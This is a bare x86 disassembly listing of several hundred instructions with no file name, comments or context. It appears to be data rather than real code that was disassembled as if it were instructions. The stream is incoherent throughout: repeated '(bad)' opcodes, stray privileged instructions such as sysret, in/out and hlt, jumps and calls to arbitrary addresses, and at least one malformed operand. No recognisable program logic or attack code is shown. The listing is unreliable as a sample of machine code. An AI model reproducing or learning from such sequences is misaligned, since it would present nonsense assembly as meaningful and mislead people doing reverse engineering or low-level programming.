  410362:	or     al,0x2b
  410364:	mov    bh,0xba
  410366:	hlt    
  410367:	mov    bh,bl
  410369:	add    BYTE PTR [ecx-0x7446f3cd],cl
  41036f:	dec    esi
  410370:	or     al,0x0
  410372:	mov    edi,DWORD PTR [ebx]
  410374:	or     BYTE PTR [ebp+0x3b],dh
  410377:	mov    ecx,DWORD PTR [edi]
  410379:	fdivr  QWORD PTR [ebx-0x7499ff83]
  41037f:	xor    al,0xd8
  410381:	pop    bp
  410383:	lock xor esi,DWORD PTR [ebx]
  410386:	lea    esp,[esi+0x1f]
  410389:	icebp  
  41038a:	jb     0x410390
  41038c:	add    al,al
  41038e:	jge    0x41039c
  410390:	mov    eax,eax
  410392:	fsubr  st,st(3)
  410394:	pop    ebp
  410395:	mov    esi,DWORD PTR [ebx]
  410397:	in     al,0x8d
  410399:	rcr    DWORD PTR [edi],0xc2
  41039c:	jb     0x4103fc
  41039e:	add    cl,cl
  4103a0:	jge    0x4103ae
  4103a2:	mov    edx,DWORD PTR [ebp-0x20]
  4103a5:	in     al,dx
  4103a6:	pop    ebp
  4103a7:	data16 data16 or BYTE PTR [esi+edi*4],bh
  4103ac:	cmp    di,WORD PTR [ebp+0x0]
  4103b0:	mov    ebp,DWORD PTR [ebx]
  4103b2:	fdivr  QWORD PTR [esi+0x668a5d]
  4103b8:	cmp    al,0x33
  4103ba:	mov    si,0x4e7d
  4103be:	mov    eax,DWORD PTR [eax]
  4103c0:	lock inc ebp
  4103c2:	mov    esi,DWORD PTR [eax]
  4103c4:	or     BYTE PTR [edi+esi*8+0x8508ba],bl
  4103cb:	clc    
  4103cc:	(bad)  
  4103cd:	cmp    edi,DWORD PTR [ebx]
  4103cf:	je     0x4103e0
  4103d1:	push   ebx
  4103d2:	loopne 0x4103e3
  4103d4:	dec    ecx
  4103d6:	mov    esp,DWORD PTR [ebp-0x1c]
  4103d9:	int    0xf1
  4103db:	mov    esi,0x703084d
  4103e0:	pcmpgtd mm6,mm1
  4103e3:	add    BYTE PTR [ebp+0x66],dh
  4103e6:	jmp    0x4103b3
  4103e8:	mov    eax,DWORD PTR [ebx]
  4103ea:	lock push ebp
  4103ec:	ror    DWORD PTR [ebp-0x2972feb3],1
  4103f2:	or     bh,dl
  4103f4:	jb     0x4103f4
  4103f6:	add    BYTE PTR [ebx-0x1a7487b3],cl
  4103fc:	loopne 0x4103fe
  4103fe:	jne    0x410402
  410400:	data16 add BYTE PTR [esi+eiz*2],dh
  410404:	mov    ecx,ebx
  410406:	data16 cmp al,0xf1
  410409:	add    BYTE PTR [esi+eiz*2],bh
  41040c:	add    bl,cl
  41040e:	retw   0xf2
  410412:	ret    0x66
  410415:	retf   
  410416:	enterw 0x4df1,0x19
  41041b:	pop    edi
  41041c:	jne    0x41039f
  41041e:	mov    esi,DWORD PTR [eax]
  410420:	call   0x77b58fc1
  410425:	xor    ebp,DWORD PTR [ebx]
  410427:	lea    esp,[esi+0x48]
  41042a:	repnz in eax,0x3b
  41042d:	add    BYTE PTR [ebp-0x37],dh
  410430:	xor    edx,DWORD PTR [ebp-0x15]
  410433:	in     al,dx
  410434:	xor    edx,DWORD PTR [esi+0x40]
  410437:	mov    DWORD PTR [edi],0x338545fc
  41043d:	clc    
  41043e:	add    esi,DWORD PTR [ecx]
  410440:	pop    edi
  410441:	pushf  
  410442:	pop    ebx
  410443:	call   0xff42040a
  410448:	mov    edi,eax
  41044a:	push   ecx
  41044b:	pop    es
  41044c:	mov    edi,DWORD PTR [eax]
  41044e:	push   esi
  41044f:	inc    esi
  410450:	add    bh,BYTE PTR [esi+0x0]
  410453:	popa   
  410454:	data16 (bad) 
  410456:	into   
  410457:	gs cmp al,0xcd
  41045a:	add    BYTE PTR [ecx+0x7ce0866],bh
  410460:	ret    0x66
  410463:	add    bh,al
  410465:	add    bh,ah
  410467:	add    BYTE PTR [ebp+0x31c3f866],al
  41046d:	cmp    al,0x9c
  41046f:	add    BYTE PTR [esi+0x66],ah
  410472:	into   
  410473:	ret    
  410474:	pop    ebp
  410475:	adc    BYTE PTR [edi+0x0],dl
  410478:	mov    bh,0x66
  41047a:	mov    edi,0xff038dc3
  41047f:	jne    0x4104d5
  410481:	lea    edx,[ecx+0x1]
  410484:	mov    ebx,0xd64ff1
  410489:	sar    DWORD PTR [ebx],1
  41048b:	test   BYTE PTR [ebp+0x36],dh
  41048e:	mov    DWORD PTR [esp+edi*8-0x76],esp
  410492:	push   edi
  410493:	xor    BYTE PTR [ebx],0x38
  410496:	mov    esi,ebx
  410498:	xor    eax,DWORD PTR [eax-0x3c73819a]
  41049e:	ss inc ebp
  4104a0:	fs pop ebx
  4104a2:	mov    ebx,0x9c3b30
  4104a7:	je     0x4104d4
  4104a9:	xor    edi,DWORD PTR [ebx+0x668a33]
  4104af:	mov    WORD PTR [ebx],?
  4104b1:	ss mov ebx,0x8b4e64
  4104b7:	pop    edi
  4104b8:	cmp    ecx,ecx
  4104ba:	jne    0x410511
  4104bc:	mov    ebp,esp
  4104be:	cld    
  4104bf:	push   esi
  4104c0:	pop    ebx
  4104c1:	inc    ebp
  4104c2:	stc    
  4104c3:	xor    BYTE PTR [ebp+0x9bef89c],al
  4104c9:	test   esi,ecx
  4104cb:	clc    
  4104cc:	test   dl,dl
  4104ce:	cmp    bh,bh
  4104d0:	fs pop si
  4104d3:	or     bl,al
  4104d5:	add    cl,BYTE PTR [ebx+0x57665100]
  4104db:	retf   0x3c45
  4104de:	xor    BYTE PTR [eax],al
  4104e0:	pushf  
  4104e1:	mov    si,0x85ca
  4104e5:	ret    0xf8
  4104e8:	pop    ebx
  4104e9:	dec    dx
  4104ec:	mov    edx,DWORD PTR [edi-0x76]
  4104ef:	push   edi
  4104f0:	add    al,0xb7
  4104f2:	xor    al,0xba
  4104f4:	cmp    al,0x8d
  4104f6:	je     0x4104f7
  4104f8:	mov    edx,DWORD PTR [edx+edi*4+0x51]
  4104fc:	lea    edi,[ebx+0x544fff]
  410502:	push   ecx
  410503:	cmp    edx,DWORD PTR [ebx+0x75]
  410506:	mov    ecx,DWORD PTR [ecx+0x723bfcbb]
  41050c:	add    BYTE PTR [ebx],dh
  41050e:	sub    ecx,DWORD PTR [ebx+0x668a33bb]
  410514:	add    BYTE PTR [ebx+esi*1+0x4f64bb36],cl
  41051b:	mov    ebx,0x3b3b00
  410520:	jne    0x41054d
  410522:	mov    DWORD PTR [ebx+0x728afc],edi
  410528:	xor    esi,DWORD PTR [ebx]
  41052a:	mov    edi,DWORD PTR [ebx+0x8d4e33]
  410530:	push   edi
  410531:	cmp    esp,ebp
  410533:	jne    0x410535
  410535:	sbb    DWORD PTR [eax],0x8085c3fc
  41053b:	clc    
  41053c:	inc    esi
  41053d:	pop    ebx
  41053e:	sti    
  41053f:	add    eax,0xeb8bc075
  410544:	cld    
  410545:	xor    edi,DWORD PTR ds:0xf8c3855e
  41054b:	mov    ecx,DWORD PTR [ecx+edx*2]
  41054e:	rol    DWORD PTR [ebp-0x37],0xf
  410552:	mov    DWORD PTR [eax],ecx
  410554:	inc    edi
  410555:	(bad)  
  410556:	in     eax,0xfe
  410558:	add    bh,bh
  41055a:	(bad)  
  41055b:	mov    esi,0xc38a5e
  410560:	mov    esi,DWORD PTR [ebx]
  410562:	push   ecx
  410563:	mov    edi,0xfc4ec7
  410568:	test   DWORD PTR [ebp-0x8],edx
  41056b:	xor    di,ax
  41056e:	pushf  
  41056f:	sub    ebp,eax
  410571:	inc    ebp
  410572:	(bad)  
  410573:	sub    edi,edi
  410575:	mov    DWORD PTR [ebx+0x3b03ba08],ecx
  41057b:	inc    ebp
  41057c:	add    BYTE PTR [esi+0x2b],ah
  41057f:	or     bh,BYTE PTR [edx+0xf8ac2]
  410585:	cmp    al,0x33
  410587:	mov    edi,DWORD PTR [edx+0xfe4e81]
  41058d:	(bad)  
  41058e:	cmp    esi,DWORD PTR [ebx]
  410590:	je     0x41054a
  410592:	push   ebx
  410593:	dec    esi
  410594:	str    ecx
  410597:	cmp    esp,DWORD PTR [ebp+0x75]
  41059a:	int    0x33
  41059c:	mov    edi,0x789085f
  4105a1:	mov    edx,DWORD PTR [eax]
  4105a3:	cld    
  4105a4:	add    cl,cl
  4105a6:	data16 add al,0xcb
  4105a9:	push   ebp
  4105aa:	add    ebp,esp
  4105ac:	jne    0x41059a
  4105ae:	(bad)  
  4105af:	mov    DWORD PTR [ecx],0xd685f7ec
  4105b5:	clc    
  4105b6:	xlat   BYTE PTR ds:[ebx]
  4105b7:	inc    ebp
  4105b8:	mov    esi,DWORD PTR [edx]
  4105ba:	push   eax
  4105bb:	pushf  
  4105bc:	in     eax,0x8b
  4105be:	add    ah,ch
  4105c0:	add    dl,BYTE PTR [eax+eax*1+0x51]
  4105c4:	add    ax,0x72cb
  4105c8:	cmp    al,0x0
  4105ca:	add    BYTE PTR [ebp+0x66],al
  4105cd:	(bad)  
  4105ce:	retf   
  4105cf:	lock ret 0x85
  4105d3:	clc    
  4105d4:	inc    bp
  4105d6:	retf   
  4105d7:	cmp    eax,0xc77d9cc8
  4105dc:	xor    ah,bh
  4105de:	pushf  
  4105df:	test   DWORD PTR [edi-0x8],ebx
  4105e2:	je     0x410629
  4105e4:	xor    esi,DWORD PTR ds:0x7020840
  4105ea:	ror    BYTE PTR [ebp-0x37],0x8d
  4105ee:	push   ebp
  4105ef:	add    esp,ebp
  4105f1:	jb     0x41057e
  4105f3:	add    BYTE PTR [eax],cl
  4105f5:	dec    ebp
  4105f6:	mov    bh,0x81
  4105f8:	push   esi
  4105f9:	push   esp
  4105fa:	adc    DWORD PTR [ecx-0x3c],0x3c9bff81
  410601:	xor    al,BYTE PTR [eax]
  410603:	mov    edx,DWORD PTR [edi+0x10]
  410606:	(bad)  
  410607:	scas   eax,DWORD PTR es:[edi]
  410608:	ret    0x3b
  41060b:	jns    0x3b4202fe
  410611:	mov    esi,DWORD PTR [eax+edx*1-0x75]
  410615:	dec    ebp
  410616:	or     BYTE PTR [ebx],ch
  410618:	ret    0x458b
  41061b:	lock jmp 0x41060f
  41061e:	mov    ecx,DWORD PTR [eax]
  410620:	or     BYTE PTR [edi],al
  410622:	mov    ecx,eax
  410624:	xor    DWORD PTR [edx+0x2],0x0
  410628:	mov    bh,0xc1
  41062a:	adc    BYTE PTR [eax],dh
  41062c:	iret   
  41062d:	inc    ebp
  41062e:	mov    DWORD PTR [ebx],0x4dfff8c4
  410634:	inc    BYTE PTR [ebx]
  410636:	ret    0xf8
  410639:	adc    DWORD PTR [esi+0x10],esp
  41063c:	clc    
  41063d:	dec    ecx
  41063e:	fisttp WORD PTR [ecx+0x456604c0]
  410644:	add    dh,BYTE PTR ds:0x75e0845
  41064a:	ret    0x4d
  41064d:	lea    ecx,[ebx+0x18728301]
  410653:	add    BYTE PTR [ebp+0x45],al
  410656:	xor    ecx,ebp
  410658:	pushf  
  410659:	add    bh,al
  41065b:	add    al,ch
  41065d:	inc    ebp
  41065e:	test   DWORD PTR [ebx-0x3eba0708],ecx
  410664:	xor    eax,0x781084d
  410669:	push   esp
  41066a:	fwait
  41066b:	push   ecx
  41066c:	xor    al,BYTE PTR [ecx+0x32f89b89]
  410672:	inc    ebp
  410673:	cmp    edi,DWORD PTR [ecx]
  410675:	jbe    0x410613
  410677:	mov    eax,edi
  410679:	or     ah,dh
  41067b:	inc    ebp
  41067c:	test   DWORD PTR [ebx+0x4d450cf8],ecx
  410682:	xor    ecx,DWORD PTR [ebx-0x74747664]
  410688:	in     al,dx
  410689:	hlt    
  41068a:	push   esp
  41068b:	push   esp
  41068c:	push   ecx
  41068d:	push   ecx
  41068e:	mov    ecx,DWORD PTR [ebx-0x7b7b0708]
  410694:	fwait
  410695:	fwait
  410696:	xor    dh,BYTE PTR [edx]
  410698:	mov    ecx,DWORD PTR [ecx+0x5bf1f8e8]
  41069e:	or     BYTE PTR [ebp+0x7],al
  4106a1:	mov    eax,ecx
  4106a3:	clc    
  4106a4:	jb     0x410667
  4106a6:	add    BYTE PTR [ebp+0x55],cl
  4106a9:	or     DWORD PTR [edi],0xc251d154
  4106af:	add    DWORD PTR [ebx+0x32009b],0x8b76453b
  4106b9:	mov    edi,eax
  4106bb:	or     cl,al
  4106bd:	inc    ebp
  4106be:	dec    ebp
  4106bf:	mov    eax,DWORD PTR [ecx+0x514d540c]
  4106c5:	or     WORD PTR [ecx],0x899b
  4106ca:	xor    cl,BYTE PTR [ebx+0x5476fc3b]
  4106d0:	mov    edx,DWORD PTR [ecx+0x8]
  4106d3:	mov    eax,DWORD PTR [ebp-0x8]
  4106d6:	mov    eax,DWORD PTR [esp+ecx*1-0x74cdb265]
  4106dd:	mov    DWORD PTR [ecx+0x4178bf8],ecx
  4106e3:	inc    ebp
  4106e4:	dec    eax
  4106e5:	add    ecx,DWORD PTR [ebx+0x544df0f8]
  4106eb:	add    edx,DWORD PTR [ecx-0x8]
  4106ee:	mov    ecx,DWORD PTR [ecx]
  4106f0:	clc    
  4106f1:	or     BYTE PTR [ebp+eax*2+0x4532409b],al
  4106f8:	mov    ecx,ebp
  4106fa:	clc    
  4106fb:	(bad)  
  4106fc:	popf   
  4106fd:	inc    DWORD PTR [eax]
  4106ff:	ret    0x8b
  410702:	adc    BYTE PTR [ebx-0x38d4aeb3],cl
  410708:	mov    edi,esp
  41070a:	hlt    
  41070b:	test   ecx,esi
  41070d:	clc    
  41070e:	or     BYTE PTR [ebp+0x7],al
  410711:	xor    al,cl
  410713:	pushf  
  410714:	jb     0x410749
  410716:	add    BYTE PTR [eax-0x3f],al
  410719:	inc    eax
  41071a:	daa    
  41071b:	inc    ebp
  41071c:	inc    ebp
  41071d:	xor    eax,0x7f80803
  410722:	dec    ebp
  410723:	fwait
  410724:	add    esi,DWORD PTR [edx]
  410726:	clc    
  410727:	cmp    DWORD PTR [ecx],ecx
  410729:	or     al,0x8
  41072b:	add    al,BYTE PTR [ebp+0x2c]
  41072e:	xor    eax,0x7350845
  410733:	or     BYTE PTR [ebp+0x7],cl
  410736:	lea    ebx,[ebx-0x748dcdff]
  41073c:	add    BYTE PTR [eax*2-0x74b21438],cl
  410743:	mov    edx,DWORD PTR [eax]
  410745:	cld    
  410746:	dec    ebp
  410747:	push   esp
  410748:	sub    edx,DWORD PTR [ecx-0x75]
  41074b:	add    eax,0xf172fc
  410750:	or     BYTE PTR [ebp+0x7],cl
  410753:	add    eax,ecx
  410755:	or     al,0x72
  410757:	add    DWORD PTR [eax],eax
  410759:	mov    ebx,0x29c2c1
  41075e:	inc    ebp
  41075f:	mov    eax,DWORD PTR [ebx]
  410761:	cmp    eax,0x3004d1c
  410767:	xbegin 0x66c69361
  41076d:	clc    
  41076e:	or     BYTE PTR [ebp+0x45],al
  410771:	xor    dh,BYTE PTR ds:0x78b089c
  410777:	adc    BYTE PTR [ebp+0x45],cl
  41077a:	lea    eax,[ebp+0x33727501]
  410780:	add    cl,ch
  410782:	inc    ebp
  410783:	add    bl,ch
  410785:	add    BYTE PTR [ebx+0x45850845],cl
  41078b:	je     0x410718
  41078d:	push   ebx
  41078e:	or     al,0x85
  410790:	dec    ebp
  410791:	std    
  410792:	mov    bh,bh
  410794:	mov    BYTE PTR [ebp-0x75],al
  410797:	mov    edi,eax
  410799:	or     al,0x89
  41079b:	inc    ebp
  41079c:	clc    
  41079d:	mov    esp,esp
  41079f:	hlt    
  4107a0:	call   DWORD PTR [edi-0x37]
  4107a3:	push   esp
  4107a4:	or     al,0x51
  4107a6:	push   ebp
  4107a7:	xor    ebp,esp
  4107a9:	mov    esi,0x457251
  4107ae:	xor    esi,eax
  4107b0:	pushf  
  4107b1:	inc    ebp
  4107b2:	(bad)  
  4107b3:	mov    edi,eax
  4107b5:	or     al,0x85
  4107b7:	add    al,bh
  4107b9:	inc    eax
  4107bb:	mov    esi,DWORD PTR [ebx+ecx*4-0x75]
  4107bf:	or     ah,bh
  4107c1:	inc    eax
  4107c2:	push   esp
  4107c3:	jmp    0x410816
  4107c5:	mov    eax,DWORD PTR ds:0xe8720c
  4107cb:	mov    DWORD PTR [ebp-0x8],eax
  4107ce:	jne    0x410815
  4107d0:	jmp    0x41075d
  4107d2:	mov    ebp,DWORD PTR [eax]
  4107d4:	clc    
  4107d5:	retf   0xff54
  4107d8:	push   ecx
  4107d9:	mov    DWORD PTR ds:0x757210,eax
  4107df:	mov    ecx,DWORD PTR [ebp-0x4]
  4107e2:	sub    esp,DWORD PTR [ebx-0x77]
  4107e5:	dec    DWORD PTR [eax*4-0x74ca8abb]
  4107ec:	or     ah,bh
  4107ee:	pop    es
  4107ef:	ds fwait
  4107f1:	push   DWORD PTR [edx]
  4107f3:	mov    ecx,DWORD PTR [ebx+0x4dc708f0]
  4107f9:	(bad)  
  4107fa:	mov    bh,bh
  4107fc:	jmp    0x4107ea
  4107fe:	leave  
  4107ff:	jne    0x410809
  410801:	call   0x2e015b
  410806:	in     al,dx
  410807:	dec    ebp
  410808:	add    dh,BYTE PTR [ebx]
  41080a:	add    BYTE PTR [ebx],al
  41080c:	inc    ebp
  41080d:	cmp    esi,DWORD PTR [ecx]
  41080f:	je     0x4107ad
  410811:	mov    eax,edi
  410813:	or     al,0xf0
  410815:	add    BYTE PTR [ebp+0x458bf845],al
  41081b:	or     BYTE PTR [ebx-0x3f7cf7b3],cl
  410821:	adc    al,0x7
  410823:	enter  0x9fc0,0xa5
  410827:	rol    BYTE PTR [eax],0x5e
  41082a:	mov    ecx,ecx
  41082c:	or     al,0xc
  41082e:	ror    BYTE PTR [ebx+0x408df8f2],0xe4
  410835:	jmp    0x410836
  410837:	push   ebp
  410838:	mov    esp,ebp
  41083a:	cld    
  41083b:	inc    ebp
  41083c:	inc    ebp
  41083d:	or     DWORD PTR [ecx+0x457dec10],0x0
  410844:	push   esi
  410845:	push   esi
  410846:	mov    edi,0x7af080f
  41084b:	add    bh,al
  41084d:	test   DWORD PTR [ebx+0x3a7320f],ebx
  410853:	add    BYTE PTR [ecx+0x4540100f],cl
  410859:	mov    ebp,eax
  41085b:	mov    ebp,edi
  41085d:	lock call edx
  410860:	fcom   DWORD PTR [ebp+0x45]
  410863:	mov    eax,0x148a8b
  410868:	push   ecx
  410869:	enter  0xc145,0x83
  41086d:	cmp    ecx,DWORD PTR [eax]
  41086f:	add    BYTE PTR [ebp+0x4d],al
  410872:	mov    eax,DWORD PTR [ebx+0x3340fcf8]
  410878:	call   0xffa103e7
  41087d:	cmp    eax,DWORD PTR [ebp-0xc]
  410880:	jmp    DWORD PTR [eax+edx*1-0x4e]
  410884:	push   ebp
  410885:	(bad)  
  410886:	call   0x32068a
  41088b:	mov    bh,0xdb
  41088d:	cld    
  41088e:	or     BYTE PTR [ebp+0x45],bl
  410891:	(bad)  
  410892:	call   0xff7b0522
  410897:	add    al,BYTE PTR [ebp+0x37]
  41089a:	xor    esi,DWORD PTR [edi+0x4e50bf03]
  4108a0:	jne    0x4108a2
  4108a2:	(bad)  
  4108a3:	cmp    edi,esp
  4108a5:	jne    0x4108d8
  4108a7:	mov    edi,edi
  4108a9:	or     BYTE PTR [ebx-0x307f0b49],cl
  4108af:	pop    ds
  4108b0:	into   
  4108b1:	je     0x410874
  4108b3:	mov    ebx,DWORD PTR [esi]
  4108b5:	or     BYTE PTR [ebp-0x49],al
  4108b8:	mov    esp,DWORD PTR [esi-0x77]
  4108bb:	mov    esi,0x2451f0c
  4108c0:	mov    eax,DWORD PTR [eax]
  4108c2:	or     al,0x66
  4108c4:	sar    bl,0x3b
  4108c7:	xor    esi,DWORD PTR [ebp+0x66]
  4108ca:	xor    ecx,edi
  4108cc:	pop    edi
  4108cd:	adc    bl,BYTE PTR [ebx+0x7e]
  4108d0:	ret    0xff
  4108d3:	cld    
  4108d4:	inc    ebp
  4108d5:	mov    ecx,DWORD PTR [ebx-0xec6e70c]
  4108db:	cld    
  4108dc:	mov    ebp,DWORD PTR [ebx+ecx*4-0x13baf3fa]
  4108e3:	push   0xffffff83
  4108e5:	pop    edi
  4108e6:	or     BYTE PTR [ebp+0x53],dh
  4108e9:	xorps  xmm1,xmm2
  4108ec:	test   BYTE PTR [eax+eax*1],bh
  4108ef:	add    BYTE PTR [eax],al
  4108f1:	adc    eax,eax
  4108f3:	add    DWORD PTR [esi+edi*2-0xff7b00],0xffffffb7
  4108fb:	jmp    DWORD PTR [eax]
  4108fd:	ror    al,0x5e
  410900:	inc    ebp
  410901:	leave  
  410902:	xor    ecx,DWORD PTR [eax]
  410904:	and    DWORD PTR [ebx-0x3ec30708],ecx
  41090a:	add    ah,al
  41090c:	xor    edi,edi
  41090e:	xor    DWORD PTR [ebx],0x66003302
  410914:	mov    DWORD PTR [ebp-0xc],ecx
  410917:	pcmpgtw mm0,mm0
  41091a:	add    dl,ah
  41091c:	leave  
  41091d:	mov    edi,DWORD PTR [ebx+eax*4+0x66]
  410921:	push   eax
  410922:	dec    ebp
  410923:	mov    esi,DWORD PTR [ebx-0x75]
  410926:	lea    ebp,[eax-0x7c00ff02]
  41092c:	xor    eax,DWORD PTR [eax]
  41092e:	sysret 
  410930:	dec    ebp
  410931:	ror    BYTE PTR [ebx+0xc000c30],0x6a
  410938:	push   WORD PTR [ecx+0x8]
  41093c:	jne    0x4108ff
  41093e:	ud0    ecx,DWORD PTR [ecx]
  410941:	mov    eax,edx
  410943:	lods   al,BYTE PTR ds:[esi]
  410944:	add    BYTE PTR [eax],al
  410946:	data16 (bad) 
  410948:	iret   
  410949:	and    cl,BYTE PTR [eax*2+0x440f8d5d]
  410950:	cli    
  410951:	inc    ebp
  410952:	cmp    al,0x8d
  410954:	add    BYTE PTR [esi+0x2d],ah
  410957:	inc    ebp
  410958:	pop    ebp
  410959:	lea    ecx,[edi]
  41095b:	mov    dl,bh
  41095d:	add    BYTE PTR [edi],cl
  41095f:	mov    DWORD PTR [eax+eax*8],edi
  410962:	mov    ebx,0x3b87
  410967:	add    BYTE PTR [ebx],ch
  410969:	inc    ebp
  41096a:	data16 (bad) 
  41096c:	clc    
  41096d:	int3   
  41096e:	cmp    eax,DWORD PTR [eax]
  410970:	je     0x4108fb
  410972:	push   0xffffffc8
  410974:	pop    edi
  410975:	xchg   DWORD PTR [ebp+0x0],eax
  410978:	data16 add BYTE PTR [ebp+0x45],cl
  41097c:	lea    cx,[ebp+0x10]
  410980:	jb     0x410982
  410982:	jmp    0x41090d
  410984:	call   eax
  410986:	clc    
  410987:	xchg   DWORD PTR [edi+0x1],edi
  41098a:	mov    eax,DWORD PTR [eax]
  41098c:	or     BYTE PTR [ebp-0x49],al
  41098f:	lea    eax,[eax+0x74003154]
  410995:	push   edi
  410996:	inc    edx
  410997:	jge    0x410998
  410999:	mov    DWORD PTR [edi],ecx
  41099b:	fdiv   DWORD PTR [edi-0x6]
  41099e:	inc    DWORD PTR [eax]
  4109a0:	xor    edx,DWORD PTR [eax+0x5f]
  4109a3:	xchg   DWORD PTR [ebx+0x1],ebx
  4109a6:	ret    0x0
  4109a9:	xor    BYTE PTR [ebp-0x51],cl
  4109ac:	cmp    edi,0xf0ff89fe
  4109b2:	data16 ror al,0x84
  4109b6:	rol    BYTE PTR [eax],0x3b
  4109b9:	add    al,dh
  4109bb:	dec    eax
  4109bc:	xchg   esp,eax
  4109bd:	push   ebx
  4109be:	jmp    0x41094b
  4109c0:	push   ebp
  4109c1:	add    esp,ebp
  4109c3:	add    ebp,esp
  4109c5:	mov    edx,DWORD PTR [edi+0x24]
  4109c8:	clc    
  4109c9:	dec    esi
  4109ca:	xchg   DWORD PTR [ebx+0x5e002001],ecx
  4109d0:	cmp    BYTE PTR [ebx],al
  4109d2:	jne    0x41095d
  4109d4:	xor    esp,eax
  4109d6:	jmp    0x440b59
  4109db:	add    ebp,DWORD PTR [ecx+ecx*4]
  4109de:	jne    0x4109d4
  4109e0:	call   0xffcb073a
  4109e5:	clc    
  4109e6:	xchg   edi,eax
  4109e7:	sti    
  4109e8:	add    DWORD PTR [ebx],eax
  4109ea:	add    BYTE PTR [ebp+0x47],bl
  4109ed:	xor    ecx,DWORD PTR [ecx+0x47e8b489]
  4109f3:	pop    ebp
  4109f4:	mov    DWORD PTR [esi-0x48],esi
  4109f7:	jmp    0x410a40
  4109f9:	mov    ecx,DWORD PTR [ecx-0x7882431c]
  4109ff:	(bad)  
  410a01:	cmp    al,0x0
  410a03:	cmp    eax,DWORD PTR [ebp+0x18]
  410a06:	lea    ebx,[ebp-0x56]
  410a09:	jle    0x410a0b
  410a0b:	jae    0x410996
  410a0d:	mov    eax,esp
  410a0f:	call   0xb900:0x8b005587
  410a16:	inc    ebp
  410a17:	push   ebp
  410a18:	lea    ecx,[ebp-0x27ff4f12]
  410a1e:	mov    eax,edi
  410a20:	int3   
  410a21:	push   ebp
  410a22:	xchg   edi,eax
  410a24:	add    esp,ebp
  410a26:	add    BYTE PTR [eax],al
  410a28:	inc    ebp
  410a29:	add    BYTE PTR [ebp+0x8b3255],cl
  410a2f:	cld    
  410a30:	mov    DWORD PTR [edx],edi
  410a32:	aam    0x75
  410a34:	xchg   DWORD PTR [ebx+0x3400dc01],ecx
  410a3a:	mov    DWORD PTR [ebx-0x50],edx
  410a3d:	test   BYTE PTR [ebp-0x1],0xe8
  410a41:	mov    eax,DWORD PTR [eax]
  410a43:	hlt    
  410a44:	add    al,al
  410a46:	mov    eax,DWORD PTR ds:0x890045a8
  410a4c:	dec    DWORD PTR [ebx+0x45fdf0e8]
  410a52:	inc    DWORD PTR [eax*2+0xf75854d]
  410a59:	mov    ebp,DWORD PTR [ebp-0x7476ff18]
  410a5f:	call   0x729767a0
  410a64:	je     0x410ac4
  410a66:	js     0x410ac7
  410a68:	lock ret 0x7e
  410a6c:	mov    ecx,DWORD PTR [ebx+0x8568b1c]
  410a72:	mov    edi,edi
  410a74:	sbb    al,bl
  410a76:	clc    
  410a77:	add    BYTE PTR [ebp-0x73],bh
  410a7a:	mov    ebx,DWORD PTR [eax-0x7437ffec]
  410a80:	ror    BYTE PTR [eax],1
  410a82:	dec    ebp
  410a83:	xchg   ebp,eax
  410a84:	mov    edi,edi
  410a86:	in     al,0x8b
  410a88:	jge    0x410a13
  410a8a:	cmp    ecx,DWORD PTR [ebx+0x39893377]
  410a90:	clc    
  410a91:	pop    esi
  410a92:	fist   DWORD PTR [ebp+0x5d398b5d]
  410a98:	clc    
  410a99:	add    al,0x6e
  410a9b:	mov    eax,DWORD PTR [ebx]
  410a9d:	mov    BYTE PTR [ebp+0x0],dl
  410aa0:	mov    edx,DWORD PTR [ebx-0x20]
  410aa3:	adc    esi,DWORD PTR [edi+0x5e005f3c]
  410aa9:	add    eax,0x3b3b73
  410aae:	adc    al,0x89
  410ab0:	pop    eax
  410ab1:	sbb    DWORD PTR [edx+eax*1],0xffffff8b
  410ab5:	ret    0xf08
  410ab8:	cmp    al,0x2
  410aba:	mov    edx,eax
  410abc:	cld    
  410abd:	add    BYTE PTR [ebp+0x66],dl
  410ac0:	add    eax,ebx
  410ac2:	add    esp,eax
  410ac4:	sub    eax,eax
  410ac6:	or     BYTE PTR [ecx-0x77f474bb],cl
  410acc:	add    BYTE PTR [eax],al
  410ace:	mov    DWORD PTR [ebx-0x24],ebx
  410ad1:	push   edi
  410ad2:	push   ebp
  410ad3:	clc    
  410ad4:	add    DWORD PTR [esi+0x1b0100],0x45
  410adb:	out    0xff,eax
  410add:	add    edx,DWORD PTR [eax]
  410adf:	jmp    0x410ac9
  410ae1:	cmp    ch,0x46
  410ae4:	(bad)  
  410ae5:	jmp    0x40c69337
  410aea:	je     0x410a76
  410aec:	mov    eax,DWORD PTR [eax-0x10c78104]
  410af2:	inc    ebp
  410af3:	add    BYTE PTR [ebx-0x770375],al
  410af9:	add    ah,ch
  410afb:	add    edx,esp
  410afd:	pop    edi
  410afe:	pop    ebp
  410aff:	push   ebp
  410b00:	inc    ebx
  410b01:	in     al,dx
  410b02:	pop    ebp
  410b03:	in     al,dx
  410b04:	cmp    edx,DWORD PTR [edi-0x8]
  410b07:	xor    DWORD PTR [esp+ebx*4-0x173676a5],edx
  410b0e:	add    al,0x47
  410b10:	push   ebp
  410b11:	mov    esp,ebp
  410b13:	in     al,0x45
  410b15:	dec    ebp
  410b16:	push   esi
  410b17:	test   DWORD PTR [eax+0xfb010f],esi
  410b1d:	add    BYTE PTR [eax+0xc018b],dh
  410b23:	leave  
  410b24:	inc    ebp
  410b25:	test   al,ch
  410b27:	add    dh,bh
  410b29:	add    bh,bh
  410b2b:	dec    ebp
  410b2c:	push   cs
  410b2d:	mov    DWORD PTR [ecx],eax
  410b2f:	hlt    
  410b30:	push   es
  410b31:	dec    ebp
  410b32:	leave  
  410b33:	mov    DWORD PTR [eax],ecx
  410b35:	clc    
  410b36:	cmovge eax,ecx
  410b39:	mov    ecx,0x85c2f0
  410b3f:	clc    
  410b40:	pop    DWORD PTR [ebp+0x1]
  410b43:	push   ebx
  410b44:	add    BYTE PTR [ebp-0x15],bh
  410b47:	push   esi
  410b48:	xor    eax,0x898a45
  410b4d:	cld    
  410b4e:	add    al,BYTE PTR [ebp+0x0]
  410b51:	xor    esp,DWORD PTR [esi-0x64]
  410b54:	add    DWORD PTR [esi+0x78308c1],edi
  410b5a:	add    ah,BYTE PTR [ebp-0x49]
  410b5d:	int    0xbb
  410b5f:	mov    ecx,DWORD PTR [esi+0xc]
  410b62:	add    dh,al
  410b64:	cmp    ecx,ebx
  410b66:	jne    0x410b30
  410b68:	xor    ecx,DWORD PTR [ebp+0x66]
  410b6b:	jmp    0xc80b71
  410b70:	add    DWORD PTR [ebp+0x0],eax
  410b73:	mov    eax,ebx
  410b75:	or     al,0x8b
  410b77:	(bad)  
  410b78:	mov    ecx,esi
  410b7a:	mov    BYTE PTR [eax+eax*1+0x664c136],cl
  410b81:	mov    eax,edi
